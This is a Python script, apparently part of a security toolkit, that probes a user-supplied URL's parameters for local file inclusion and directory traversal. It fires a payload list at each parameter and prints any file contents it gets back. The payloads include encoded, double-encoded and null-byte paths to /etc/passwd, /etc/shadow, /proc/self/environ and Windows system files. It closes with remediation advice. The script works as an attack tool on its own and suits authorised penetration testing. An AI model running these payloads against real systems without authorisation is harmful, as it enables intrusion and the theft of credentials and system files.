import requests
import urllib.parse
from colorama import init, Fore, Style

init(autoreset=True)


def run():
    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}║{Fore.GREEN}              LFI / DIRECTORY TRAVERSAL SCANNER                     {Fore.CYAN}║")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    target = input(
        f"\n{Fore.YELLOW}Enter target URL with parameters (e.g., http://site.com/page.php?file=about): {Style.RESET_ALL}").strip()

    if not target:
        print(f"\n{Fore.RED}[!] Empty input. Aborting.{Style.RESET_ALL}")
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
        return

    if not target.startswith(('http://', 'https://')):
        print(f"\n{Fore.RED}[!] URL must start with http:// or https://{Style.RESET_ALL}")
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
        return

    print(f"\n{Fore.CYAN}[+] Analyzing URL parameters for LFI vulnerability{Style.RESET_ALL}")

    parsed = urllib.parse.urlparse(target)
    query_params = urllib.parse.parse_qs(parsed.query)

    if not query_params:
        print(
            f"\n{Fore.RED}[!] No URL parameters found. LFI testing requires parameters like ?file=about{Style.RESET_ALL}")
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
        return

    print(f"\n{Fore.GREEN}[✓] Found parameters: {list(query_params.keys())}{Style.RESET_ALL}")

    lfi_params = list(query_params.keys())
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}LFI TESTING RESULTS")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    vulnerable = False
    linux_payloads = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
        "../../../../etc/passwd%00",
        "/etc/passwd",
        "../../../../../../../../etc/passwd",
        "....//....//etc/passwd",
        "..///////..////..//////etc/passwd",
        "../../../../etc/shadow%00",
        "../../../../proc/self/environ%00"
    ]

    windows_payloads = [
        "..\\..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "..%255c..%255c..%255c..%255cwindows%255cwin.ini",
        "C:\\windows\\win.ini",
        "..\\..\\..\\..\\boot.ini",
        "../../../../windows/system32/drivers/etc/hosts"
    ]

    for param in lfi_params:
        print(f"\n{Fore.CYAN}[→] Testing parameter: {param}{Style.RESET_ALL}")

        for payload in linux_payloads + windows_payloads:
            test_params = query_params.copy()
            test_params[param] = [payload]
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = f"{base_url}?{test_query}"

            try:
                response = requests.get(test_url, timeout=8, verify=False, allow_redirects=False)

                indicators = [
                    "root:x:", "daemon:x:", "bin:x:", "nobody:x:",
                    "[extensions]", "[fonts]", "[files]", "[Mail]",
                    "localhost", "127.0.0.1", "root:", "admin:",
                    "<?php", "<?xml", "<!DOCTYPE"
                ]

                if any(indicator in response.text for indicator in indicators) and response.status_code != 404:
                    if "root:x:" in response.text or "[extensions]" in response.text:
                        vulnerable = True
                        print(f"{Fore.RED}[!] VULNERABLE: {param} = {payload}{Style.RESET_ALL}")
                        print(f"    URL: {test_url[:80]}...")
                        print(f"    Status: {response.status_code}")

                        snippet = response.text
                        if "root:x:" in snippet:
                            lines = [line for line in snippet.split('\n') if
                                     'root:' in line or 'bin:' in line or 'daemon:' in line]
                            if lines:
                                print(f"    Content snippet:")
                                for line in lines[:3]:
                                    print(f"      {line[:100]}")
                        elif "[extensions]" in snippet:
                            print(f"    Content snippet: Windows INI file detected")

                        if "%00" in payload:
                            print(f"    {Fore.YELLOW}Note: Null byte injection used (PHP < 5.3.4){Style.RESET_ALL}")
                        elif "..%2f" in payload:
                            print(f"    {Fore.YELLOW}Note: URL encoding used to bypass filters{Style.RESET_ALL}")
                        elif "..%252f" in payload:
                            print(f"    {Fore.YELLOW}Note: Double URL encoding used{Style.RESET_ALL}")
                        break

            except requests.exceptions.Timeout:
                continue
            except Exception:
                continue

    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}LFI TESTING COMPLETE")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    if vulnerable:
        print(f"\n{Fore.RED}[!] LFI VULNERABILITY CONFIRMED{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}Risk Level: HIGH{Style.RESET_ALL}")
        print(f"   • Attackers can read sensitive files")
        print(f"   • Potential for remote code execution via log poisoning")
        print(f"   • Full system compromise possible")

        print(f"\n{Fore.YELLOW}Recommendations:{Style.RESET_ALL}")
        print(f"   • NEVER use user input directly in file paths")
        print(f"   • Use whitelist validation for file parameters")
        print(f"   • Store files outside web root")
        print(f"   • Implement proper input sanitization:")
        print(f"        filename = basename($_GET['file'])")
        print(f"        $allowed = ['about', 'contact', 'faq']")
        print(f"        if (!in_array($filename, $allowed)) die('Invalid file');")
        print(f"   • Disable dangerous PHP functions: allow_url_include=Off")
        print(f"   • Use chroot/jails for additional isolation")
    else:
        print(f"\n{Fore.GREEN}[✓] No obvious LFI vulnerabilities detected{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}Note:{Style.RESET_ALL}")
        print(f"   • This is a basic test. Advanced bypasses may exist")
        print(f"   • Test with authenticated sessions")
        print(f"   • Check for wrapper-based exploits (php://filter, data://)")
        print(f"   • Manual testing recommended for critical applications")

    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.GREEN}[✓] LFI analysis completed{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")